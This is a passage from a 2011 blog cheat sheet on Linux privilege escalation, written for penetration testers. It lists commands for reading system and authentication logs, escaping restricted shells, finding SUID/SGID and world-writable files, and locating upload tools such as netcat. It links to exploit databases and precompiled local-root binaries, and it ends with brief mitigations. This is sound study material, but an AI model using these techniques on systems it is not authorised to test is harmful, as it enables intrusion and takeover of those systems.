<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/httpd/logs/access_log
</span><span class="line">cat /etc/httpd/logs/access.log
</span><span class="line">cat /etc/httpd/logs/error_log
</span><span class="line">cat /etc/httpd/logs/error.log
</span><span class="line">cat /var/log/apache2/access_log
</span><span class="line">cat /var/log/apache2/access.log
</span><span class="line">cat /var/log/apache2/error_log
</span><span class="line">cat /var/log/apache2/error.log
</span><span class="line">cat /var/log/apache/access_log
</span><span class="line">cat /var/log/apache/access.log
</span><span class="line">cat /var/log/auth.log
</span><span class="line">cat /var/log/chttp.log
</span><span class="line">cat /var/log/cups/error_log
</span><span class="line">cat /var/log/dpkg.log
</span><span class="line">cat /var/log/faillog
</span><span class="line">cat /var/log/httpd/access_log
</span><span class="line">cat /var/log/httpd/access.log
</span><span class="line">cat /var/log/httpd/error_log
</span><span class="line">cat /var/log/httpd/error.log
</span><span class="line">cat /var/log/lastlog
</span><span class="line">cat /var/log/lighttpd/access.log
</span><span class="line">cat /var/log/lighttpd/error.log
</span><span class="line">cat /var/log/lighttpd/lighttpd.access.log
</span><span class="line">cat /var/log/lighttpd/lighttpd.error.log
</span><span class="line">cat /var/log/messages
</span><span class="line">cat /var/log/secure
</span><span class="line">cat /var/log/syslog
</span><span class="line">cat /var/log/wtmp
</span><span class="line">cat /var/log/xferlog
</span><span class="line">cat /var/log/yum.log
</span><span class="line">cat /var/run/utmp
</span><span class="line">cat /var/webmin/miniserv.log
</span><span class="line">cat /var/www/logs/access_log
</span><span class="line">cat /var/www/logs/access.log
</span><span class="line">ls -alh /var/lib/dhcp3/
</span><span class="line">ls -alh /var/log/postgresql/
</span><span class="line">ls -alh /var/log/proftpd/
</span><span class="line">ls -alh /var/log/samba/
</span><span class="line">
</span><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
</span></code></pre></td></tr></tbody></table></div></figure><p><em>Note: <a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/">http://www.thegeekstuff.com/2011/08/linux-var-log-files/</a></em></p><a name="If.commands.are.limited..you.break.out.of.the..jail..shell."></a><h4>If commands are limited, you break out of the "jail" shell?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">python -c <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</span><span class="line"><span class="nb">echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
</span><span class="line">/bin/sh -i
</span></code></pre></td></tr></tbody></table></div></figure><a name="How.are.file-systems.mounted."></a><h4>How are file-systems mounted?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">mount
</span><span class="line">df -h
</span></code></pre></td></tr></tbody></table></div></figure><a name="Are.there.any.unmounted.file-systems."></a><h4>Are there any unmounted file-systems?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/fstab
</span></code></pre></td></tr></tbody></table></div></figure><a name="What..Advanced.Linux.File.Permissions..are.used...em.Sticky.bits..SUID..amp..GUID..em."></a><h4>What "Advanced Linux File Permissions" are used? <em>Sticky bits, SUID &amp; GUID</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span></pre></td><td class="code"><pre><code class="bash"><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   <span class="c"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
</span><span class="line">find / -perm -g<span class="o">=</span>s -type f 2&gt;/dev/null    <span class="c"># SGID (chmod 2000) - run as the group, not the user who started it.</span>
</span><span class="line">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null    <span class="c"># SUID (chmod 4000) - run as the owner, not the user who started it.</span>
</span><span class="line">
</span><span class="line">find / -perm -g<span class="o">=</span>s -o -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null    <span class="c"># SGID or SUID</span>
</span><span class="line"><span class="k">for</span> i in <span class="sb">`</span>locate -r <span class="s2">"bin$"</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span> find <span class="nv">$i</span> <span class="se">\</span><span class="o">(</span> -perm -4000 -o -perm -2000 <span class="se">\</span><span class="o">)</span> -type f 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>    <span class="c">#
 Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, 
/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID 
(Quicker search)</span>
</span><span class="line">
</span><span class="line"><span class="c"># find starting at root (/), 
SGID or SUID, not Symbolic links, only 3 folders deep, list with more 
detail and hide any errors (e.g. permission denied)</span>
</span><span class="line">find / -perm -g<span class="o">=</span>s -o -perm -4000 ! -type l -maxdepth <span class="m">3</span> -exec ls -ld <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</span></code></pre></td></tr></tbody></table></div></figure><a name="Where.can.written.to.and.executed.from...em.A.few..common..places:..tmp...var.tmp...dev.shm..em."></a><h4>Where can written to and executed from? <em>A few 'common' places: /tmp, /var/tmp, /dev/shm</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span></pre></td><td class="code"><pre><code class="bash"><span class="line">find / -writable -type d 2&gt;/dev/null      <span class="c"># world-writeable folders</span>
</span><span class="line">find / -perm -222 -type d 2&gt;/dev/null     <span class="c"># world-writeable folders</span>
</span><span class="line">find / -perm -o w -type d 2&gt;/dev/null     <span class="c"># world-writeable folders</span>
</span><span class="line">
</span><span class="line">find / -perm -o x -type d 2&gt;/dev/null     <span class="c"># world-executable folders</span>
</span><span class="line">
</span><span class="line">find / <span class="se">\</span><span class="o">(</span> -perm -o w -perm -o x <span class="se">\</span><span class="o">)</span> -type d 2&gt;/dev/null   <span class="c"># world-writeable &amp; executable folders</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="Any..problem..files...em.Word-writeable...nobody..files..em."></a><h4>Any "problem" files? <em>Word-writeable, "nobody" files</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">find / -xdev -type d <span class="se">\</span><span class="o">(</span> -perm -0002 -a ! -perm -1000 <span class="se">\</span><span class="o">)</span> -print   <span class="c"># world-writeable files</span>
</span><span class="line">find /dir -xdev <span class="se">\</span><span class="o">(</span> -nouser -o -nogroup <span class="se">\</span><span class="o">)</span> -print   <span class="c"># Noowner files</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="Preparation..amp..Finding.Exploit.Code"></a><h2>Preparation &amp; Finding Exploit Code</h2><a name="What.development.tools.languages.are.installed.supported."></a><h4>What development tools/languages are installed/supported?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">find / -name perl*
</span><span class="line">find / -name python*
</span><span class="line">find / -name gcc*
</span><span class="line">find / -name cc
</span></code></pre></td></tr></tbody></table></div></figure><a name="How.can.files.be.uploaded."></a><h4>How can files be uploaded?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span></pre></td><td class="code"><pre><code class="bash"><span class="line">find / -name wget
</span><span class="line">find / -name nc*
</span><span class="line">find / -name netcat*
</span><span class="line">find / -name tftp*
</span><span class="line">find / -name ftp
</span></code></pre></td></tr></tbody></table></div></figure><a name="Finding.exploit.code"></a><h4>Finding exploit code</h4><p><a href="http://www.exploit-db.com/">http://www.exploit-db.com</a></p><p><a href="http://1337day.com/">http://1337day.com</a></p><p><a href="http://www.securiteam.com/">http://www.securiteam.com</a></p><p><a href="http://www.securityfocus.com/">http://www.securityfocus.com</a></p><p><a href="http://www.exploitsearch.net/">http://www.exploitsearch.net</a></p><p><a href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></p><p><a href="http://securityreason.com/">http://securityreason.com</a></p><p><a href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></p><p><a href="http://www.google.com/">http://www.google.com</a></p><a name="Finding.more.information.regarding.the.exploit"></a><h4>Finding more information regarding the exploit</h4><p><a href="http://www.cvedetails.com/">http://www.cvedetails.com</a></p><p><code>http://packetstormsecurity.org/files/cve/[CVE]</code></p><p><code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</code></p><p><code>http://www.vulnview.com/cve-details.php?cvename=[CVE]</code></p><a name="L.Quick...Common..exploits...em.Warning..Pre-compiled.binaries.files..Use.at.your.own.risk..em."></a><h4>(Quick) "Common" exploits. <em>Warning. Pre-compiled binaries files. Use at your own risk</em></h4><p><a href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p><p><a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p><a name="Mitigations"></a><h2>Mitigations</h2><a name="Is.any.of.the.above.information.easy.to.find."></a><h4>Is any of the above information easy to find?</h4><p>Try doing it! Setup a cron job which automates script(s) and/or 3rd party products</p><a name="Is.the.system.fully.patched."></a><h4>Is the system fully patched?</h4><p><em>Kernel, operating system, all applications, their plugins and web services</em></p><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">apt-get update <span class="o">&amp;&amp;</span> apt-get upgrade
</span><span class="line">yum update
</span></code></pre></td></tr></tbody></table></div></figure><a name="Are.services.running.with.the.minimum.level.of.privileges.required."></a><h4>Are services running with the minimum level of privileges required?</h4><p>For example, do you need to run MySQL as root?</p><a name="Scripts..em.Can.any.of.this.be.automated....em."></a><h4>Scripts <em>Can any of this be automated?!</em></h4><p><a href="http://pentestmonkey.net/tools/unix-privesc-check/">http://pentestmonkey.net/tools/unix-privesc-check/</a></p><p><a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a></p><p><a href="http://bastille-linux.sourceforge.net/">http://bastille-linux.sourceforge.net</a></p><a name="Other..quick..guides..amp..Links"></a><h2>Other (quick) guides &amp; Links</h2><a name="Enumeration"></a><h4>Enumeration</h4><p><a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a></p><p><a href="http://www.microloft.co.uk/hacking/hacking3.htm">http://www.microloft.co.uk/hacking/hacking3.htm</a></p><a name="Misc"></a><h4>Misc</h4><p><a href="http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf">http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</a></p><p><a href="http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf">http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf</a></p><p><a href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html">http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</a></p></div><footer><p class="meta"><span class="byline author vcard">Posted by <span class="fn">g0tmi1k</span></span><time class="entry-date" datetime="2011-08-02"><span class="date"><span class="date-month">Aug</span> <span class="date-day">2</span><span class="date-suffix">nd</span>, <span class="date-year">2011</span></span> <span class="time">12:00 am</span></time><span class="categories"> <a class="category" href="https://blog.g0tmi1k.com/bypassing/">bypassing</a>, <a class="category" href="https://blog.g0tmi1k.com/commands/">commands</a>, <a class="category" href="https://blog.g0tmi1k.com/privilege-escalation/">privilege escalation</a> </span></p><div class="sharing"></div><p class="meta"> <a class="basic-alignment left" href="https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/" title="Previous Post: Pentesting With BackTrack (PWB) + Offensive Security Certified Professional (OSCP)">« Pentesting With BackTrack (PWB) + Offensive Security Certified Professional (OSCP)</a> <a class="basic-alignment right" href="https://blog.g0tmi1k.com/2011/08/de-icenet-v12a-120a-level-1-disk/" title="Next Post: De-ICE.net v1.2a (1.20a) {Level 1 - Disk 3 - Version A}">De-ICE.net v1.2a (1.20a) {Level 1 - Disk 3 - Version A} »</a></p> </footer> </article></div><aside class="sidebar"> <section class="odd"> <a href="https://blog.g0tmi1k.com/"><img src="Basic%20Linux%20Privilege%20Escalation_files/logo.png" class="center" alt="g0tmi1k" id="logo" height="163" width="290"></a> </section> <section class="even"><h2>Recent Posts</h2><ul id="recent_posts"><li class="post"> <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/">DVWA - Brute Force (High Level) - Anti-CSRF Tokens</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/">DVWA - Brute Force (Medium Level) - Time Delay</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/">DVWA Brute Force (Low Level) - HTTP GET Form [Hydra, Patator, Burp]</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/dvwa/login/">DVWA - Main Login Page - Brute Force HTTP POST Form With CSRF Tokens</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/dvwa/index/">Damn Vulnerable Web Application (DVWA)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2014/01/offensive-security-wireless/">Offensive Security Wireless Attacks (WiFu) + Offensive Security Wireless (OSWP)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/">Cracking the Perimeter (CTP) + Offensive Security Certified Expert (OSCE)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-php-web-application/">pWnOS 2 (PHP Web Application)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-sql-injection/">pWnOS 2 (SQL Injection)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/09/21ltr-scene-1/">21LTR - Scene 1</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/09/stripe-ctf-20-web-edition/">Stripe CTF 2.0 (Web Edition)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/">Kioptrix - Level 4 (Local File Inclusion)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/">Kioptrix - Level 4 (SQL Injection)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-limited-shell/">Kioptrix - Level 4 (Limited Shell)</a></li><li class="post"> <a href="https://blog.g0tmi1k.com/2012/01/hackademic-rtb2/">Hackademic RTB2</a></li></ul> </section> </aside><span class="toggle-sidebar"></span></div></div> <footer role="contentinfo"><div id="footer"> <span style="float:left"> <a href="https://blog.g0tmi1k.com/atom.xml" title="RSS"><img src="Basic%20Linux%20Privilege%20Escalation_files/rss.png" alt="RSS Feed" title="RSS" height="24" width="24"></a> <a href="https://github.com/g0tmi1k" title="GitHub"><img src="Basic%20Linux%20Privilege%20Escalation_files/github.png" alt="GitHub Profile" title="GitHub" height="24" width="24"></a> <a href="https://twitter.com/g0tmi1k" title="Twitter"><img src="Basic%20Linux%20Privilege%20Escalation_files/twitter.png" alt="Twitter Profile" title="Twitter" height="24" width="24"></a> <a href="http://plus.google.com/110108403609022118432" title="Google Plus"><img src="Basic%20Linux%20Privilege%20Escalation_files/google-plus.png" alt="Google Plus Profile" title="Google Plus" height="24" width="24"></a> </span> <span style="float:right"><p>Copyright © 2009-<span id="footer_date">2017</span> <span class="credit">g0tmi1k</span></p> </span> <script src="Basic%20Linux%20Privilege%20Escalation_files/email-decode.js"></script><script type="text/rocketscript" data-rocketoptimized="true">document.getElementById("footer_date").innerHTML=(new Date).getFullYear()</script></div></footer> <script data-rocketsrc="/javascripts/modernizr-2.0.js" type="text/rocketscript" data-rocketoptimized="true"></script><script data-rocketsrc="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/rocketscript" data-rocketoptimized="true"></script><script type="text/rocketscript" data-rocketoptimized="true">window.jQuery||document.write('<script src="/javascripts/libs/jquery.min.js"><\/script>')</script><script data-rocketsrc="/javascripts/op.js" type="text/rocketscript" data-rocketoptimized="true"></script><script type="text/rocketscript" data-rocketoptimized="true">!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new
 
Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src=n,s.parentNode.insertBefore(o,s)}(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-22029722-4","auto"),ga("send","pageview")</script></body></html>